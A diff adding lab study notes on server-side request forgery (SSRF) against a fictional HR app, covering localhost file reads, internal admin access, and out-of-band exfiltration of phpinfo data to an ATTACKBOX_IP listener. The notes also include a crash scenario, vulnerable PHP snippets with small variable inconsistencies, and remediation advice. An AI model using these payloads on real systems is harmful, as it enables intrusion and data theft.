@@ -1,0 +1,169 @@
+# TASK 3 Types of SSRF - Basic
+
+Basic SSRF tricks a server into making unauthorized requests, often targeting internal systems or third-party services. 
+Exploiting input validation flaws, attackers can access sensitive data or control remote resources, posing security risks.
+
+## Scenario - I: SSRF Against a Local Server
+
+In this attack, the attacker exploits the server's ability to make requests to itself using a loopback IP or localhost. 
+For example, the HRMS application loads pages based on a `url` parameter, such as `http://hrms.thm/?url=localhost/copyright`. 
+Due to insufficient input validation, an attacker can manipulate the `url` parameter to access sensitive files like `http://hrms.thm/?url=localhost/config`, forcing the server to fetch and display unauthorized content.
+
+How it works:
+
+1. Test the HRMS website for SSRF by visiting http://hrms.thm, which redirects to http://hrms.thm/?url=localhost/copyright.
+2. The page shows the copyright status, hinting at SSRF vulnerability.
+3. The page handling the `url` parameter has a vulnerability. Example code:
+
+   ```php
+   /*************************************************************************************
+   * Vulnerable Script:
+   * php
+   * $uri = rtrim($_GET['url'], "/");
+   * $path = ROOTPATH . $file;
+   * if (file_exists($path)) {
+   *      echo "<pre>" . htmlspecialchars(file_get_contents($path)) . "</pre>";
+   * } else {
+   *      echo "<p class='text-xl'>" . ltrim($file, "/") . " is not found</p>";
+   * }
+   *************************************************************************************/
+   ```
+
+4. The `url` parameter lacks filtering, allowing access to localhost files. Changing `http://hrms.thm/?url=localhost/copyright` to `http://hrms.thm/?url=localhost/hello` shows an error: `hello.php` not found.
+5. The page footer displays content from files like `config.php` when accessed via `http://hrms.thm/?url=localhost/config`, exposing sensitive data such as credentials:
+
+   ```php
+   /*************************************************************************************
+   * Example `config.php`:
+   * php
+   * <?php 
+   * $adminURL = "xxxxxxx";
+   * $username = "xxxxx"; 
+   * $password = "xxxx"; 
+   * ...
+   * ?>
+   *************************************************************************************/
+   ```
+
+---
+
+# TASK 4 Types of SSRF - Basic (Continued)
+
+## Scenario - II: Accessing an Internal Server
+
+Attackers exploit input validation flaws to trick a server into accessing internal resources. 
+Internal servers, often on non-routable IPs (e.g., 192.168.x.x), are inaccessible to external users but can be targeted via SSRF.
+
+Example:    
+A vulnerable HRMS app fetches data from `http://192.168.2.10/employees.php`. 
+By modifying the dropdown value to `http://192.168.2.10/admin.php`, the attacker gains access to the admin panel, bypassing network restrictions.
+
+Steps:
+
+1. Log in to the HRMS dashboard using credentials.
+2. Inspect the dropdown fetching data from `http://192.168.2.10/employees.php`.
+3. Change the dropdown value to `http://192.168.2.10/admin.php` using browser dev tools.
+4. Select the modified option to access the admin panel.
+
+---
+
+# TASK 5 Types of SSRF - Blind
+
+## Blind SSRF With Out-Of-Band
+
+Blind SSRF occurs when attackers send requests to a server but cannot directly see the responses. 
+Exploitation often involves out-of-band (OOB) techniques, where attackers use external channels (e.g., DNS or HTTP) to confirm the vulnerability and gather data.
+
+Example:
+
+1. The HRMS app sends data to `getInfo.php` via `profile.php?url=localhost/getInfo.php`.
+2. The `url` parameter is vulnerable, allowing attackers to redirect requests to their server.
+
+Vulnerable `profile.php`:
+
+```php
+/*************************************************************************************
+* <?php
+* ...
+* $targetUrl = $_GET['url'];
+* ob_start();
+* ob_start();
+* phpinfo();
+* $phpInfoData = ob_get_clean();
+* $ch = curl_init($targetUrl); 
+* curl_setopt($ch, CURLOPT_POST, 1);
+* curl_setopt($ch, CURLOPT_POSTFIELDS,$phpInfoData);
+* curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+* $response = curl_exec($ch); 
+* ...
+* ?>
+*************************************************************************************/
+```
+
+The page reads the `url` parameter and sends it to the specified server without validation.
+
+An attacker can redirect the request to their server to gather data. 
+Create SSRF_exploit_server.py on your AttackBox to capture and save the content to data.html. 
+Start a lightweight server using the following commands:
+
+```
+ATTACKER_PC $ sudo chmod +x server.py && sudo python3 server.py
+```
+
+Visit http://hrms.thm/profile.php?url=http://ATTACKBOX_IP:8080 in your browser. 
+Check data.html on the attack box for logged server information to plan further attacks.
+
+## Semi-Blind SSRF (Time-based)
+
+Time-based SSRF exploits response delays to infer success. 
+Attackers send requests to different URLs, measuring response times. 
+Longer delays suggest the server accessed the target, confirming the SSRF attack.
+
+---
+
+# TASK 6 A Classic Example - Crashing the Server
+
+An attacker can exploit SSRF to crash a server or cause denial of service by supplying a malicious URL that consumes excessive resources. 
+For example, a URL pointing to a large file or a slow server can overwhelm the application, leading to a crash.
+
+## Scenario: Crashing the Server
+
+1. Log in to the HRMS dashboard and navigate to the Training tab, which loads content via `http://hrms.thm/url.php?id=192.168.2.10/trainingbanner.jpg`.
+2. Modify the `id` parameter to `10.10.10.10` to confirm SSRF vulnerability.
+3. The `url.php` script loads images but crashes if the image size exceeds 100KB:
+
+   ```php
+   /*************************************************************************************
+   * <?php
+   * ....
+   * ....
+   *     if ($imageSize < 100) {
+   *         // Output the image if it's within the size limit
+   *     
+   *         $base64Image = downloadAndEncodeImage($imageUrl);
+   *         echo '<img src="' . htmlspecialchars($base64Image) . '" alt="Image" style="width: 100%; height: 100%; object-fit: cover;">';
+   * 
+   *     } else {
+   *         // Memory Outage - server will crash
+   *     
+   * .....
+   * ...
+   *************************************************************************************/
+   ```
+
+4. Trigger a crash by loading a large image, e.g., `http://hrms.thm/url.php?id=192.168.2.10/bigImage.jpg`.
+
+---
+
+# TASK 7 Remedial Measures
+
+- Input Validation        : Validate and sanitise all user input, especially URLs or parameters used for external requests.  
+- Use Allowlists          : Use allowlists of trusted URLs/domains instead of blocklists.  
+- Network Segmentation    : Segment networks to isolate sensitive internal resources from external access.  
+- Security Headers        : Apply security headers like Content-Security-Policy to restrict external resource loading.  
+- Access Controls         : Enforce strong access controls for internal resources to prevent unauthorised access.  
+- Logging and Monitoring  : Log and monitor requests for unusual activity, setting alerts for suspicious behaviour.  
+
+---
+
+# Appendix
